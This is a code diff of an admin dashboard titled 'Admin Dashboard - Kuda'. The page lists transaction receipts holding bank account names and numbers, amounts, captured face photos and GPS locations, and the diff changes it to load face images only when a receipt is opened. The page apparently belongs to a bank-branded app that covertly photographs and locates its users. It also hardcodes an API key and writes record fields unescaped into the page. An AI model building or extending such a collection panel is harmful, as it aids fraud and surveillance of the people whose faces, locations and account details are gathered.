@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Admin Dashboard - Kuda</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -23,7 +26,9 @@
         .admin-stat-label { font-size: 14px; color: #999; text-transform: uppercase; margin-bottom: 10px; }
         .admin-stat-value { font-size: 32px; font-weight: 700; color: #1a1a2e; }
         .admin-receipts { background: white; border-radius: 12px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
-        .admin-receipts-header { padding: 20px; border-bottom: 1px solid #e0e0e0; font-size: 18px; font-weight: 600; color: #333; }
+        .admin-receipts-header { padding: 20px; border-bottom: 1px solid #e0e0e0; font-size: 18px; font-weight: 600; color: #333; display: flex; justify-content: space-between; align-items: center; }
+        .refresh-btn { padding: 6px 14px; background: #1a1a2e; color: white; border: none; border-radius: 6px; cursor: pointer; font-size: 13px; }
+        .refresh-btn:hover { background: #16213e; }
         .admin-receipts-list { max-height: 600px; overflow-y: auto; }
         .admin-receipt-item { padding: 15px 20px; border-bottom: 1px solid #f0f0f0; cursor: pointer; }
         .admin-receipt-item:hover { background: #f9f9f9; }
@@ -45,6 +50,8 @@
         .admin-detail-row { display: flex; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid #f0f0f0; font-size: 14px; }
         .admin-detail-row span:first-child { color: #999; font-weight: 500; }
         .admin-detail-row span:last-child { color: #333; font-weight: 600; text-align: right; max-width: 60%; word-break: break-word; }
+        .face-badge { display: inline-block; padding: 2px 8px; background: #27ae60; color: white; border-radius: 4px; font-size: 11px; margin-left: 8px; }
+        .no-face-badge { display: inline-block; padding: 2px 8px; background: #e0e0e0; color: #999; border-radius: 4px; font-size: 11px; margin-left: 8px; }
         @media (max-width: 768px) {
             .admin-sidebar { display: none; }
             .admin-content { padding: 15px; }
@@ -81,13 +88,16 @@
                     </div>
                     <div class="admin-stat-card">
                         <div class="admin-stat-label">Total Amount</div>
-                        <div class="admin-stat-value" id="totalAmount">₦0</div>
+                        <div class="admin-stat-value" id="totalAmount">0</div>
                     </div>
                 </div>
                 <div class="admin-receipts">
-                    <div class="admin-receipts-header">Recent Transactions</div>
+                    <div class="admin-receipts-header">
+                        <span>Recent Transactions</span>
+                        <button class="refresh-btn" onclick="forceRefresh()">Refresh</button>
+                    </div>
                     <div class="admin-receipts-list" id="receiptsList">
-                        <div class="admin-empty">📭 Waiting for transactions...</div>
+                        <div class="admin-empty">Loading...</div>
                     </div>
                 </div>
             </div>
@@ -104,114 +114,111 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script src="/js/supabase-client.js"></script>
     <script>
         const SUPABASE_URL = 'https://rgnorcrlshskaindafzs.supabase.co';
         const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJnbm9yY3Jsc2hza2FpbmRhZnpzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2OTQ5MzgsImV4cCI6MjA5MzI3MDkzOH0.yluqapG5--VaXyGuSVdJYMeizewYLzkG3lbebVDu1pY';
 
         let allReceipts = [];
-        let fetchSuccess = false;
+        let faceCache = {};
 
-        // Direct REST API fetch - bypasses Supabase JS client entirely
-        // This is the most reliable way to get data
-        async function fetchReceiptsDirect() {
-            const response = await fetch(SUPABASE_URL + '/rest/v1/receipts?select=*&order=created_at.desc', {
+        // Fetch list WITHOUT captured_face (5KB instead of 123KB - fast on any network)
+        async function fetchReceiptsList() {
+            const url = SUPABASE_URL + '/rest/v1/receipts?select=id,username,account_name,bank_name,account_number,amount,narration,reference_number,transaction_date,transaction_type,location_latitude,location_longitude,location_accuracy,created_at&order=created_at.desc';
+            const response = await fetch(url, {
                 headers: {
                     'apikey': SUPABASE_ANON_KEY,
-                    'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
-                    'Content-Type': 'application/json'
+                    'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
                 }
             });
-            if (!response.ok) throw new Error('REST API returned ' + response.status);
+            if (!response.ok) throw new Error('HTTP ' + response.status);
             return await response.json();
         }
 
-        // Try multiple methods to fetch receipts - never give up
-        async function fetchReceipts() {
-            // Method 1: Direct REST API (most reliable)
+        // Fetch face image for a single receipt (only when clicked)
+        async function fetchFaceImage(receiptId) {
+            if (faceCache[receiptId]) return faceCache[receiptId];
             try {
-                const data = await fetchReceiptsDirect();
-                if (data && data.length >= 0) return data;
+                const url = SUPABASE_URL + '/rest/v1/receipts?select=captured_face&id=eq.' + receiptId;
+                const response = await fetch(url, {
+                    headers: {
+                        'apikey': SUPABASE_ANON_KEY,
+                        'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+                    }
+                });
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data && data[0] && data[0].captured_face) {
+                        faceCache[receiptId] = data[0].captured_face;
+                        return data[0].captured_face;
+                    }
+                }
             } catch (e) {
-                console.error('REST API failed:', e);
+                console.error('Failed to fetch face:', e);
             }
-
-            // Method 2: Supabase JS client
-            try {
-                const data = await getAllReceiptsFromCloud();
-                if (data && data.length >= 0) return data;
-            } catch (e) {
-                console.error('Supabase JS failed:', e);
-            }
-
-            // Method 3: Retry REST API one more time
-            try {
-                await new Promise(r => setTimeout(r, 2000));
-                const data = await fetchReceiptsDirect();
-                if (data && data.length >= 0) return data;
-            } catch (e) {
-                console.error('REST API retry failed:', e);
-            }
-
-            return null; // All methods failed
+            return null;
         }
 
         window.addEventListener('load', async () => {
             loadReceipts();
-            setInterval(loadReceipts, 5000);
+            setInterval(loadReceipts, 10000);
         });
 
-        async function loadReceipts() {
-            const receipts = await fetchReceipts();
-            const statusEl = document.getElementById('connectionStatus');
+        function forceRefresh() {
+            allReceipts = [];
+            document.getElementById('receiptsList').innerHTML = '<div class="admin-empty">Refreshing...</div>';
+            loadReceipts();
+        }
 
-            if (!receipts) {
-                // Fetch failed - DON'T wipe existing data, just show error
-                fetchSuccess = false;
+        async function loadReceipts() {
+            const statusEl = document.getElementById('connectionStatus');
+            try {
+                const receipts = await fetchReceiptsList();
                 if (statusEl) {
-                    statusEl.textContent = 'Connection error - retrying...';
+                    statusEl.textContent = 'Connected - ' + new Date().toLocaleTimeString();
+                    statusEl.style.color = '#27ae60';
+                }
+                allReceipts = receipts;
+                renderReceipts(receipts);
+                updateStats(receipts);
+            } catch (e) {
+                console.error('Fetch failed:', e);
+                if (statusEl) {
+                    statusEl.textContent = 'Error - retrying...';
                     statusEl.style.color = '#e74c3c';
                 }
                 if (allReceipts.length === 0) {
-                    document.getElementById('receiptsList').innerHTML = '<div class="admin-empty">Loading... If this persists, check your internet connection.</div>';
+                    document.getElementById('receiptsList').innerHTML = '<div class="admin-empty">Could not load. Tap Refresh to try again.</div>';
                 }
+            }
+        }
+
+        function renderReceipts(receipts) {
+            const list = document.getElementById('receiptsList');
+            if (receipts.length === 0) {
+                list.innerHTML = '<div class="admin-empty">Waiting for transactions...</div>';
                 return;
             }
-
-            fetchSuccess = true;
-            if (statusEl) {
-                statusEl.textContent = 'Connected - Last updated ' + new Date().toLocaleTimeString();
-                statusEl.style.color = '#27ae60';
-            }
-
-            allReceipts = receipts;
-            const receiptsList = document.getElementById('receiptsList');
-
-            if (receipts.length === 0) {
-                receiptsList.innerHTML = '<div class="admin-empty">Waiting for transactions...</div>';
-            } else {
-                receiptsList.innerHTML = receipts.map(r => `
-                    <div class="admin-receipt-item" onclick="viewReceipt('${r.id}')">
-                        <span class="admin-receipt-username">${r.username || 'Unknown'}</span>
-                        <span class="admin-receipt-time">${formatTime(r.created_at)}</span>
-                        <div style="clear: both;"></div>
-                        <div class="admin-receipt-details">
-                            <div>Amount: ₦${Number(r.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</div>
-                            <div>Bank: ${r.bank_name || 'N/A'}</div>
-                            <div>Account: ${r.account_number || 'N/A'}</div>
-                            <div>Type: ${r.transaction_type === 'credit' ? 'Top-up' : 'Transfer'}</div>
-                            <div>Narration: ${r.narration || 'N/A'}</div>
-                            <div>Ref: ${r.reference_number || 'N/A'}</div>
-                        </div>
-                        ${r.location_latitude && r.location_longitude ? `<a href="https://maps.google.com/?q=${r.location_latitude},${r.location_longitude}" target="_blank" style="color:#667eea;font-size:12px;">View on Maps (${Number(r.location_latitude).toFixed(4)}, ${Number(r.location_longitude).toFixed(4)})</a>` : '<span style="color:#e74c3c;font-size:12px;">No location captured</span>'}
-                        <div class="admin-receipt-images">
-                            ${r.captured_face ? `<img src="${r.captured_face}" class="admin-receipt-image" title="Captured Face">` : ''}
-                        </div>
-                    </div>
-                `).join('');
-            }
-            updateStats(receipts);
+            list.innerHTML = receipts.map(r => {
+                const hasFace = r.captured_face !== undefined;
+                return '<div class="admin-receipt-item" onclick="viewReceipt(\'' + r.id + '\')">' +
+                    '<span class="admin-receipt-username">' + (r.username || 'Unknown') +
+                        (hasFace ? '<span class="face-badge">Photo</span>' : '<span class="no-face-badge">No photo</span>') +
+                    '</span>' +
+                    '<span class="admin-receipt-time">' + formatTime(r.created_at) + '</span>' +
+                    '<div style="clear: both;"></div>' +
+                    '<div class="admin-receipt-details">' +
+                        '<div>Amount: N' + Number(r.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2}) + '</div>' +
+                        '<div>Bank: ' + (r.bank_name || 'N/A') + '</div>' +
+                        '<div>Account: ' + (r.account_number || 'N/A') + '</div>' +
+                        '<div>Type: ' + (r.transaction_type === 'credit' ? 'Top-up' : 'Transfer') + '</div>' +
+                        '<div>Narration: ' + (r.narration || 'N/A') + '</div>' +
+                        '<div>Ref: ' + (r.reference_number || 'N/A') + '</div>' +
+                    '</div>' +
+                    (r.location_latitude && r.location_longitude
+                        ? '<a href="https://maps.google.com/?q=' + r.location_latitude + ',' + r.location_longitude + '" target="_blank" style="color:#667eea;font-size:12px;">View on Maps (' + Number(r.location_latitude).toFixed(4) + ', ' + Number(r.location_longitude).toFixed(4) + ')</a>'
+                        : '<span style="color:#e74c3c;font-size:12px;">No location captured</span>') +
+                '</div>';
+            }).join('');
         }
 
         function updateStats(receipts) {
@@ -220,28 +227,34 @@
             const total = receipts.reduce((sum, r) => sum + parseFloat(r.amount || 0), 0);
             document.getElementById('totalReceipts').textContent = receipts.length;
             document.getElementById('todayReceipts').textContent = todayCount;
-            document.getElementById('totalAmount').textContent = '₦' + total.toLocaleString();
+            document.getElementById('totalAmount').textContent = 'N' + total.toLocaleString();
         }
 
-        function viewReceipt(id) {
+        async function viewReceipt(id) {
             const receipt = allReceipts.find(r => r.id === id);
-            if (receipt) {
-                const modalBody = document.getElementById('modalBody');
-                modalBody.innerHTML = `
-                    ${receipt.captured_face ? `<img src="${receipt.captured_face}" class="admin-modal-image">` : ''}
-                    <div class="admin-detail-row"><span>Username</span><span>${receipt.username || 'Unknown'}</span></div>
-                    <div class="admin-detail-row"><span>Type</span><span>${receipt.transaction_type === 'credit' ? 'Top-up' : 'Transfer'}</span></div>
-                    <div class="admin-detail-row"><span>Amount</span><span>₦${Number(receipt.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</span></div>
-                    <div class="admin-detail-row"><span>Bank</span><span>${receipt.bank_name || 'N/A'}</span></div>
-                    <div class="admin-detail-row"><span>Account Name</span><span>${receipt.account_name || 'N/A'}</span></div>
-                    <div class="admin-detail-row"><span>Account Number</span><span>${receipt.account_number || 'N/A'}</span></div>
-                    <div class="admin-detail-row"><span>Narration</span><span>${receipt.narration || 'N/A'}</span></div>
-                    <div class="admin-detail-row"><span>Reference</span><span>${receipt.reference_number || 'N/A'}</span></div>
-                    <div class="admin-detail-row"><span>Date</span><span>${receipt.transaction_date ? new Date(receipt.transaction_date).toLocaleString() : 'N/A'}</span></div>
-                    ${receipt.location_latitude && receipt.location_longitude ? `<div class="admin-detail-row"><span>Location</span><span><a href="https://maps.google.com/?q=${receipt.location_latitude},${receipt.location_longitude}" target="_blank" style="color:#667eea;">${Number(receipt.location_latitude).toFixed(4)}, ${Number(receipt.location_longitude).toFixed(4)}</a></span></div>` : '<div class="admin-detail-row"><span>Location</span><span style="color:#e74c3c;">Not captured</span></div>'}
-                `;
-                document.getElementById('receiptModal').classList.add('show');
-            }
+            if (!receipt) return;
+
+            const modalBody = document.getElementById('modalBody');
+            modalBody.innerHTML = '<div style="text-align:center;padding:20px;">Loading details...</div>';
+            document.getElementById('receiptModal').classList.add('show');
+
+            // Fetch face image separately
+            const face = await fetchFaceImage(id);
+
+            modalBody.innerHTML =
+                (face ? '<img src="' + face + '" class="admin-modal-image">' : '') +
+                '<div class="admin-detail-row"><span>Username</span><span>' + (receipt.username || 'Unknown') + '</span></div>' +
+                '<div class="admin-detail-row"><span>Type</span><span>' + (receipt.transaction_type === 'credit' ? 'Top-up' : 'Transfer') + '</span></div>' +
+                '<div class="admin-detail-row"><span>Amount</span><span>N' + Number(receipt.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2}) + '</span></div>' +
+                '<div class="admin-detail-row"><span>Bank</span><span>' + (receipt.bank_name || 'N/A') + '</span></div>' +
+                '<div class="admin-detail-row"><span>Account Name</span><span>' + (receipt.account_name || 'N/A') + '</span></div>' +
+                '<div class="admin-detail-row"><span>Account Number</span><span>' + (receipt.account_number || 'N/A') + '</span></div>' +
+                '<div class="admin-detail-row"><span>Narration</span><span>' + (receipt.narration || 'N/A') + '</span></div>' +
+                '<div class="admin-detail-row"><span>Reference</span><span>' + (receipt.reference_number || 'N/A') + '</span></div>' +
+                '<div class="admin-detail-row"><span>Date</span><span>' + (receipt.transaction_date ? new Date(receipt.transaction_date).toLocaleString() : 'N/A') + '</span></div>' +
+                (receipt.location_latitude && receipt.location_longitude
+                    ? '<div class="admin-detail-row"><span>Location</span><span><a href="https://maps.google.com/?q=' + receipt.location_latitude + ',' + receipt.location_longitude + '" target="_blank" style="color:#667eea;">' + Number(receipt.location_latitude).toFixed(4) + ', ' + Number(receipt.location_longitude).toFixed(4) + '</a></span></div>'
+                    : '<div class="admin-detail-row"><span>Location</span><span style="color:#e74c3c;">Not captured</span></div>');
         }
 
         function closeModal() {
@@ -256,9 +269,9 @@
             const diffHours = Math.floor(diffMs / 3600000);
             const diffDays = Math.floor(diffMs / 86400000);
             if (diffMins < 1) return 'just now';
-            if (diffMins < 60) return `${diffMins}m ago`;
-            if (diffHours < 24) return `${diffHours}h ago`;
-            if (diffDays < 7) return `${diffDays}d ago`;
+            if (diffMins < 60) return diffMins + 'm ago';
+            if (diffHours < 24) return diffHours + 'h ago';
+            if (diffDays < 7) return diffDays + 'd ago';
             return date.toLocaleDateString();
         }
 
